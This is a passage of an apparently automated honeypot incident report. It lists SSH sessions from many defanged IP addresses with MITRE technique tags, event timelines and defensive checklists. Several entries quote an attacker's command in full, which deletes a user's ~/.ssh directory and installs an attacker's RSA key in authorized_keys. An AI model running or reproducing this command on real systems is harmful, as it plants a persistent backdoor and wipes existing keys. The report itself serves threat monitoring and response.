| `2026-08-29 22:19:57` | `cowrie.login.success` |
| `2026-08-29 22:19:57` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.84[.]246` to AbuseIPDB if not already reported
- [ ] Block `116.114.84[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b17791661d17

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-08-29 22:20 |
| **Last Seen** | 2026-08-29 22:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:20:03` | `cowrie.session.connect` |
| `2026-08-29 22:20:03` | `cowrie.client.version` |
| `2026-08-29 22:20:03` | `cowrie.client.kex` |
| `2026-08-29 22:20:04` | `cowrie.login.success` |
| `2026-08-29 22:20:05` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3599dcde2059

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 22:21 |
| **Last Seen** | 2026-08-29 22:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:21:24` | `cowrie.session.connect` |
| `2026-08-29 22:21:24` | `cowrie.client.version` |
| `2026-08-29 22:21:25` | `cowrie.client.kex` |
| `2026-08-29 22:21:27` | `cowrie.login.success` |
| `2026-08-29 22:21:27` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:21:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 22:21:27` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0962aa6a1183

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-08-29 22:21 |
| **Last Seen** | 2026-08-29 22:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:21:51` | `cowrie.session.connect` |
| `2026-08-29 22:21:51` | `cowrie.client.version` |
| `2026-08-29 22:21:51` | `cowrie.client.kex` |
| `2026-08-29 22:21:52` | `cowrie.login.success` |
| `2026-08-29 22:21:53` | `cowrie.session.params` |
| `2026-08-29 22:21:53` | `cowrie.command.input` |
| `2026-08-29 22:21:53` | `cowrie.command.failed` |
| `2026-08-29 22:21:53` | `cowrie.log.closed` |
| `2026-08-29 22:21:54` | `cowrie.session.params` |
| `2026-08-29 22:21:54` | `cowrie.command.input` |
| `2026-08-29 22:21:54` | `cowrie.session.file_download` |
| `2026-08-29 22:21:54` | `cowrie.log.closed` |
| `2026-08-29 22:21:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15b3a36c5e05

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-08-29 22:21 |
| **Last Seen** | 2026-08-29 22:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:21:54` | `cowrie.session.connect` |
| `2026-08-29 22:21:54` | `cowrie.client.version` |
| `2026-08-29 22:21:55` | `cowrie.client.kex` |
| `2026-08-29 22:21:55` | `cowrie.login.success` |
| `2026-08-29 22:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0033733b14e9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 22:21 |
| **Last Seen** | 2026-08-29 22:22 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:21:55` | `cowrie.session.connect` |
| `2026-08-29 22:21:55` | `cowrie.client.version` |
| `2026-08-29 22:21:55` | `cowrie.client.kex` |
| `2026-08-29 22:21:58` | `cowrie.login.success` |
| `2026-08-29 22:21:59` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:22:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 22:22:00` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-717fa8e130b3

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-08-29 22:21 |
| **Last Seen** | 2026-08-29 22:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:21:56` | `cowrie.session.connect` |
| `2026-08-29 22:21:56` | `cowrie.client.version` |
| `2026-08-29 22:21:56` | `cowrie.client.kex` |
| `2026-08-29 22:21:57` | `cowrie.login.success` |
| `2026-08-29 22:21:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98107a33a68d

| Field | Detail |
|---|---|
| **Source IP** | `155.94.155[.]107` |
| **First Seen** | 2026-08-29 22:23 |
| **Last Seen** | 2026-08-29 22:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:23:36` | `cowrie.session.connect` |
| `2026-08-29 22:23:36` | `cowrie.client.version` |
| `2026-08-29 22:23:36` | `cowrie.client.kex` |
| `2026-08-29 22:23:37` | `cowrie.login.success` |
| `2026-08-29 22:23:37` | `cowrie.session.params` |
| `2026-08-29 22:23:37` | `cowrie.command.input` |
| `2026-08-29 22:23:37` | `cowrie.command.failed` |
| `2026-08-29 22:23:38` | `cowrie.log.closed` |
| `2026-08-29 22:23:38` | `cowrie.session.params` |
| `2026-08-29 22:23:38` | `cowrie.command.input` |
| `2026-08-29 22:23:38` | `cowrie.session.file_download` |
| `2026-08-29 22:23:38` | `cowrie.log.closed` |
| `2026-08-29 22:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.94.155[.]107` to AbuseIPDB if not already reported
- [ ] Block `155.94.155[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56eccb8cef9c

| Field | Detail |
|---|---|
| **Source IP** | `155.94.155[.]107` |
| **First Seen** | 2026-08-29 22:23 |
| **Last Seen** | 2026-08-29 22:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:23:38` | `cowrie.session.connect` |
| `2026-08-29 22:23:38` | `cowrie.client.version` |
| `2026-08-29 22:23:38` | `cowrie.client.kex` |
| `2026-08-29 22:23:39` | `cowrie.login.success` |
| `2026-08-29 22:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.94.155[.]107` to AbuseIPDB if not already reported
- [ ] Block `155.94.155[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d567c646df8

| Field | Detail |
|---|---|
| **Source IP** | `155.94.155[.]107` |
| **First Seen** | 2026-08-29 22:23 |
| **Last Seen** | 2026-08-29 22:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:23:39` | `cowrie.session.connect` |
| `2026-08-29 22:23:39` | `cowrie.client.version` |
| `2026-08-29 22:23:39` | `cowrie.client.kex` |
| `2026-08-29 22:23:39` | `cowrie.login.success` |
| `2026-08-29 22:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.94.155[.]107` to AbuseIPDB if not already reported
- [ ] Block `155.94.155[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-961460fcddd2

| Field | Detail |
|---|---|
| **Source IP** | `54.36.99[.]29` |
| **First Seen** | 2026-08-29 22:26 |
| **Last Seen** | 2026-08-29 22:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:26:08` | `cowrie.session.connect` |
| `2026-08-29 22:26:08` | `cowrie.client.version` |
| `2026-08-29 22:26:09` | `cowrie.client.kex` |
| `2026-08-29 22:26:09` | `cowrie.login.success` |
| `2026-08-29 22:26:10` | `cowrie.session.params` |
| `2026-08-29 22:26:10` | `cowrie.command.input` |
| `2026-08-29 22:26:10` | `cowrie.command.failed` |
| `2026-08-29 22:26:10` | `cowrie.log.closed` |
| `2026-08-29 22:26:11` | `cowrie.session.params` |
| `2026-08-29 22:26:11` | `cowrie.command.input` |
| `2026-08-29 22:26:11` | `cowrie.session.file_download` |
| `2026-08-29 22:26:11` | `cowrie.log.closed` |
| `2026-08-29 22:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.36.99[.]29` to AbuseIPDB if not already reported
- [ ] Block `54.36.99[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747124e182ca

| Field | Detail |
|---|---|
| **Source IP** | `54.36.99[.]29` |
| **First Seen** | 2026-08-29 22:26 |
| **Last Seen** | 2026-08-29 22:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:26:11` | `cowrie.session.connect` |
| `2026-08-29 22:26:11` | `cowrie.client.version` |
| `2026-08-29 22:26:11` | `cowrie.client.kex` |
| `2026-08-29 22:26:11` | `cowrie.login.success` |
| `2026-08-29 22:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.36.99[.]29` to AbuseIPDB if not already reported
- [ ] Block `54.36.99[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3189ed80e90

| Field | Detail |
|---|---|
| **Source IP** | `54.36.99[.]29` |
| **First Seen** | 2026-08-29 22:26 |
| **Last Seen** | 2026-08-29 22:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:26:12` | `cowrie.session.connect` |
| `2026-08-29 22:26:12` | `cowrie.client.version` |
| `2026-08-29 22:26:12` | `cowrie.client.kex` |
| `2026-08-29 22:26:12` | `cowrie.login.success` |
| `2026-08-29 22:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.36.99[.]29` to AbuseIPDB if not already reported
- [ ] Block `54.36.99[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d6303a1cc1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 22:31 |
| **Last Seen** | 2026-08-29 22:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:31:30` | `cowrie.session.connect` |
| `2026-08-29 22:31:30` | `cowrie.client.version` |
| `2026-08-29 22:31:31` | `cowrie.client.kex` |
| `2026-08-29 22:31:31` | `cowrie.login.success` |
| `2026-08-29 22:31:32` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:31:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 22:31:32` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-850b5651630a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 22:33 |
| **Last Seen** | 2026-08-29 22:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:33:18` | `cowrie.session.connect` |
| `2026-08-29 22:33:18` | `cowrie.client.version` |
| `2026-08-29 22:33:19` | `cowrie.client.kex` |
| `2026-08-29 22:33:20` | `cowrie.login.success` |
| `2026-08-29 22:33:21` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:33:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 22:33:21` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0d50c580e3f

| Field | Detail |
|---|---|
| **Source IP** | `108.234.110[.]202` |
| **First Seen** | 2026-08-29 22:35 |
| **Last Seen** | 2026-08-29 22:35 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:35:03` | `cowrie.session.connect` |
| `2026-08-29 22:35:04` | `cowrie.client.version` |
| `2026-08-29 22:35:04` | `cowrie.client.kex` |
| `2026-08-29 22:35:10` | `cowrie.login.success` |
| `2026-08-29 22:35:12` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.234.110[.]202` to AbuseIPDB if not already reported
- [ ] Block `108.234.110[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7228acdddda4

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-08-29 22:37 |
| **Last Seen** | 2026-08-29 22:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:37:32` | `cowrie.session.connect` |
| `2026-08-29 22:37:33` | `cowrie.client.version` |
| `2026-08-29 22:37:33` | `cowrie.client.kex` |
| `2026-08-29 22:37:35` | `cowrie.login.success` |
| `2026-08-29 22:37:37` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f3baf89d3c

| Field | Detail |
|---|---|
| **Source IP** | `180.193.181[.]195` |
| **First Seen** | 2026-08-29 22:37 |
| **Last Seen** | 2026-08-29 22:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:37:43` | `cowrie.session.connect` |
| `2026-08-29 22:37:43` | `cowrie.client.version` |
| `2026-08-29 22:37:43` | `cowrie.client.kex` |
| `2026-08-29 22:37:46` | `cowrie.login.success` |
| `2026-08-29 22:37:46` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.193.181[.]195` to AbuseIPDB if not already reported
- [ ] Block `180.193.181[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52e0e9cb3930

| Field | Detail |
|---|---|
| **Source IP** | `106.89.51[.]153` |
| **First Seen** | 2026-08-29 22:37 |
| **Last Seen** | 2026-08-29 22:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:37:50` | `cowrie.session.connect` |
| `2026-08-29 22:37:51` | `cowrie.client.version` |
| `2026-08-29 22:37:51` | `cowrie.client.kex` |
| `2026-08-29 22:37:53` | `cowrie.login.success` |
| `2026-08-29 22:37:54` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.89.51[.]153` to AbuseIPDB if not already reported
- [ ] Block `106.89.51[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68280db4dec5

| Field | Detail |
|---|---|
| **Source IP** | `147.15.110[.]51` |
| **First Seen** | 2026-08-29 22:38 |
| **Last Seen** | 2026-08-29 22:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:38:00` | `cowrie.session.connect` |
| `2026-08-29 22:38:00` | `cowrie.client.version` |
| `2026-08-29 22:38:00` | `cowrie.client.kex` |
| `2026-08-29 22:38:03` | `cowrie.login.success` |
| `2026-08-29 22:38:03` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.110[.]51` to AbuseIPDB if not already reported
- [ ] Block `147.15.110[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9c102c8955e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 22:41 |
| **Last Seen** | 2026-08-29 22:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:41:26` | `cowrie.session.connect` |
| `2026-08-29 22:41:26` | `cowrie.client.version` |
| `2026-08-29 22:41:26` | `cowrie.client.kex` |
| `2026-08-29 22:41:27` | `cowrie.login.success` |
| `2026-08-29 22:41:27` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:41:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 22:41:28` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdcc314a2036

| Field | Detail |
|---|---|
| **Source IP** | `222.117.176[.]58` |
| **First Seen** | 2026-08-29 22:42 |
| **Last Seen** | 2026-08-29 22:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:42:51` | `cowrie.session.connect` |
| `2026-08-29 22:42:51` | `cowrie.client.version` |
| `2026-08-29 22:42:51` | `cowrie.client.kex` |
| `2026-08-29 22:42:54` | `cowrie.login.success` |
| `2026-08-29 22:42:54` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.117.176[.]58` to AbuseIPDB if not already reported
- [ ] Block `222.117.176[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a58cc4819ac1

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]11` |
| **First Seen** | 2026-08-29 22:43 |
| **Last Seen** | 2026-08-29 22:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:43:00` | `cowrie.session.connect` |
| `2026-08-29 22:43:00` | `cowrie.client.version` |
| `2026-08-29 22:43:00` | `cowrie.client.kex` |
| `2026-08-29 22:43:02` | `cowrie.login.success` |
| `2026-08-29 22:43:03` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]11` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1548f95956ca

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 22:44 |
| **Last Seen** | 2026-08-29 22:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
